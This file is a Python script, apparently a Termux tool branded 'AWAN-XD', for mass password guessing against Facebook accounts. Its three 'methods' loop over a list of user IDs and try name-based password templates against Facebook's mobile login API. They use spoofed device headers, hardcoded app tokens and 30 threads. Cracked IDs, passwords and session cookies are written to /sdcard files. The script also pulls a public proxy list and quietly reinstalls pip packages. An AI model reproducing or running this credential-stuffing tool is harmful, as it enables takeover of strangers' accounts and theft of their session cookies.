import os,json,hashlib,io,struct
os.system('clear')






def getua():
	END  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/196.0.0.70;FBBV/126133157;FBDM/{density=3.5,width=1440,height=2960};FBLC/fil_PH;FBCR/Econet Leo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N950U;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	ua = random.choice(['Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))',])+END
	return ua
	
import os,sys,random,requests,string
from time import time as timex
import requests,os,re,bs4,sys,uuid,json
import time,random,datetime,subprocess
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup
remover = '\x1b[1;0m'
green = '\x1b[1;92m'
red = "\033[1;91m"
orange = '\x1b[38;5;208m'
yal = "\033[1;93m"
whi = "\033[1;97m"
W = '\x1b[1;97m'
G = '\x1b[1;92m'
R = '\x1b[1;91m'
S = '\x1b[1;96m'
B = '\x1b[1;94m'
Y = '\x1b[1;93m'
P = '\x1b[1;95m'
lin = "------------------------------------"
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from concurrent.futures import ThreadPoolExecutor
try:
	open('.prox.txt','w').write(requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt').text)
except requests.exceptions.ConnectionError:
	exit('[•] Lol Network ')
def prox():
    proxies = open('.prox.txt','r').read().splitlines()
    return {'http': 'socks5://'+random.choice(proxies)}

import os,sys,tempfile,string,random,subprocess,platform,uuid,os,shutil,zlib,smtplib,base64,uuid,time,json,re
from uuid import uuid4
from time import sleep as sp

try:
	import requests
except ModuleNotFoundError:
	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requestsv')
	

try:
	import bs4
	from bs4 import BeautifulSoup as pars
except ModuleNotFoundError:
	os.system('pip install bs4')
except Exception as e:
	print(e)


from concurrent.futures import ThreadPoolExecutor as tpe
import requests
from requests.exceptions import ConnectionError as CE


sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'ar_AR'
try:
	fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
	fbcr = 'Roshan'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
	fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
	total = 0
	for i in fbcr:
		total+=1
	select = ('1','2')
	if select == '1':
		fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
		sim_id+=fbcr
	elif select == '2':
		try:
			fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
			sim_id+=fbcr
		except Exception as e:
			fbcr = "Roshan"
			sim_id+=fbcr
	else:
		fbcr = 'Roahan'
		sim_id+=fbcr
except:
	fbcr = "Roahan"
device = {'android_version':android_version,
'model':model,
'build':build,
'fblc':fblc,
'fbmf':fbmf,
'fbbd':fbbd,
'fbdv':model,
'fbsv':fbsv,
'fbca':fbca,
'fbdm':fbdm}

####@-----Folder-----@####
try:os.mkdir('/sdcard/AWAN')
except:pass

try:
	key = open(".key.txt","r").read()
except FileNotFoundError:
	key = 'none'



def p(x):
	print(x)



id = []
ok = []
cp = []
loop = 0
method=[]
SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
ses = requests.Session()

      

logo = (f'''\033[1;92m
 ╔═╗╦ ╦╔═╗╔╗╔\033[1;97m ┃ [➛] Owner   : AWAN-XD
 \033[1;92m╠═╣║║║╠═╣║║║ \033[1;97m┃ [➛] STATUS  : PERSONAL
 \033[1;92m╩ ╩╚╩╝╩ ╩╝╚╝ \033[1;97m┃ [➛] VERSION : \033[1;91mV/PRO\033[1;97m
――――――――――――――――――――――――――――――――――――――――――――''')




def clear():
	os.system("clear")
	print(logo)
def line():
    print('\33[1;97m――――――――――――――――――――――――――――――――――――――――――――――')






nid = ''.join((random.choice(['A','a','B','b','c','C','d','D','e','E','F','f','G','g','h','H','i','I','j','J','k','K','l','L','m','M','N','n','o','O','p','P','q','Q','r','R','s','S','t','T','u','U','v','V','w','W','x','X','y','Y','z','Z']) for i in range(12)))
tid = str(random.randint(111,999))
class iAmMain:
	
	def __init__(self):

		self.gp = "https://b-graph.facebook.com/auth/login"
		self.ap = "https://b-api.facebook.com/auth/login"
	def iAmMenu(self):
		clear()
		
		
		print(f'[1] File cloning \n[0] {R}Exit Menu')
		line()
		opt1 = input('[?] Choose an option: ')
		if opt1 == "1":self.file_menu()
		
		elif opt1 == "2":exit()
		else:p("[•] Wrong Select ");sp(2);self.iAmMenu()
	
	
	
	def file_menu(self):
		clear()
		file = input('[?] Put file path\033[1;37m: ')
		try:
			id = open(file,"r").read().splitlines()
			self.method_select(id)
		except FileNotFoundError:
			p("[•] File Path Incorrect ")
			sp(2);self.file_menu()
		
	def method_select(self,id):
		clear()
		print("[1] Method ")
		print("[2] Method ")
		print("[3] Method ")
		line()
		m_opt = input('[?] Choose: ')
		if m_opt =='1':
			method.append("i")
			self.password_menu(id)
		elif m_opt =="2":
			method.append('ii')
			self.password_menu(id)
		elif m_opt =="3":
			method.append('iii')
			self.password_menu(id)
		
		else:p("[•] Wrong Select ! ");sp(2);self.method_select(id)

	def password_menu(self,id):
		pwx=[]
		clear()
		max = 20	
		try:
			plimit = int(input('[?] Put Password Limit : '))
			if plimit =="":
				plimit = 4
			elif plimit > max:
				p("\033[1;97m[\033[1;96m•\033[1;97m] Password Limit Should undet 20 ");sp(2);self.password_menu()
		except:
			plimit = 4
		clear()
		for n in range(plimit):
			pwx.append(input("[?] Put password %s : "%(n+1)))
		clear()
		p("[=] Total Ids  : \033[1;32m%s "%(str(len(id))))
		print("\033[1;91m[•] Use Flight Mode For Speed Up!\033[1;97m")
		line()
		with tpe(max_workers=30) as saqi:
			for user in id:
				uid = user.split("|")[0]
				nm = user.split("|")[1]
				if "i" in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif "ii" in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif "iii" in method:
					saqi.submit(self.method3,uid,nm,pwx)
				
	def saved_results(self,ok,cp):
		p("\033[1;97m")
		line()
		#
		input("[=] Press Enter To Go Back ")
		self.iAmMenu()

	

	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write(f"\r[M1] \033[1;96m%s\033[1;97m | OK | \033[1;92m%s "%(loop,len(ok)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				random_seed = random.Random()
				adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "it_IT",
"client_country_code": "US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': getua(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '6060',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					#cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					token = q["access_token"]
					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cok = f"sb={sb};{coki}"
					p('\r\033[1;92m[OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/AWAN-OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/AWAN-COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;91m[AWAN-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/AWAN-CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method1(uid,nm,pwx)
		except Exception as e:
			self.method1(uid,nm,pwx)
	
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write(f"\r[M2] \033[1;96m%s\033[1;97m | OK | \033[1;92m%s "%(loop,len(ok)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				random_seed = random.Random()
				adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
				data = {
					"adid": adid,
					"format": "json",
					"device_id": str(uuid.uuid4()),
					"cpl": "true",
					"family_device_id": str(uuid.uuid4()),
					"credentials_type": "device_based_login_password",
					"error_detail_type": "button_with_disabled",
					"source": "device_based_login",
					"email": uid,
					"password": pw,
					"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
					"generate_session_cookies": "1",
					"meta_inf_fbmeta": "",
					"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
					"currently_logged_in_userid": "0",
					"locale": "en_US",
					"client_country_code": "US",
					"method": "auth.login",
					"fb_api_req_friendly_name": "authenticate",
					"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
					"api_key": "882a8490361da98702bf97a021ddc14d",}
				headers={
					'User-Agent': getua(),
					'Content-Type': 'application/x-www-form-urlencoded',
					'Host': 'graph.facebook.com',
					'X-FB-Net-HNI': '25227',
					'X-FB-SIM-HNI': '29752',
					'X-FB-Connection-Type': 'MOBILE.LTE',
					'X-Tigon-Is-Retry': 'False',
					'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
					'x-fb-device-group': '5120',
					'X-FB-Friendly-Name': 'ViewerReactionsMutation',
					'X-FB-Request-Analytics-Tags': 'graphservice',
					'X-FB-HTTP-Engine': 'Liger',
					'X-FB-Client-IP': 'True',
					'X-FB-Server-Cluster': 'True',
					'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
					'Content-Length': '704'}	
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					token = q["access_token"]
					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cok = f"sb={sb};{coki}"
					p('\r\033[1;92m[OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/AWAN-OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/AWAN-COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;91m[AWAN-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/AWAN-CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method2(uid,nm,pwx)
		except Exception as e:
			self.method2(uid,nm,pwx)
			
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write(f"\r[M3] \033[1;96m%s\033[1;97m | OK | \033[1;92m%s "%(loop,len(ok)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				random_seed = random.Random()
				adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
				#li = ['28','29','210']
				#li2 = random.choice(li)
				#j1 = ''.join(random.choice(digits) for _ in range(2))
				#jazoest = li2
				data = {"adid": adid,
"format": "json",
"device_id": str(uuid.uuid4()),
"email": uid,
"password": pw,
"generate_analytics_claim": "1",
"community_id": "",
"cpl": "true",
"try_num": "1",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "password",
"enroll_misauth": "false",
"generate_session_cookies": "1",
"source": "switcher_add_account",
"machine_id": str(uuid.uuid4()),
"jazoest": "07605",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "PK",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "AuthOperations$24PasswordAuthOperation",
"api_key": "256002347743983",
"sig": "3dec97858a19a0e102570e6876dc335f",
"access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895"}
				headers={'user-agent': getua(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'authorization': 'OAuth null', 'x-zero-eh': 'PRMoHo,W,EFbRyRHyu3xuqaD1gBBJMEarggBoapj1by1RA1U31PAAaloBxrAEFbWB33x1r', 'x-fb-connection-quality': 'EXCELLENT', 'zero-rated': '0', 'x-fb-connection-bandwidth': '69453097', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-privacy-context': 'PRMoHo,W,EFbRyRHyu3xuqaD1gBBJMEarggBoapj1by1RA1U31PAAaloBxrAEFbWB33x1r', 'x-fb-connection-type': 'WIFI', 'x-tigon-is-retry': 'False', 'x-fb-rmd': 'cached=0;state=URL_ELIGIBLE', 'x-fb-friendly-name': 'authenticate', 'x-fb-request-analytics-tags': '{"network_tags":{"retry_attempt":"0"},"application_tags":"unknown"}', 'x-fb-http-engine': 'Liger', 'x-fb-client-ip': 'True', 'x-fb-server-cluster': 'True', 'Content-Length': '775'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()

				if "session_key" in q:
					#cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					token = q["access_token"]
					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cok = f"sb={sb};{coki}"
					p('\r\033[1;92m[OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/AWAN-OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/AWAN-COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;91m[AWAN-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/AWAN-CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method3(uid,nm,pwx)
		except Exception as e:
			self.method3(uid,nm,pwx)




iAmMain().iAmMenu()    

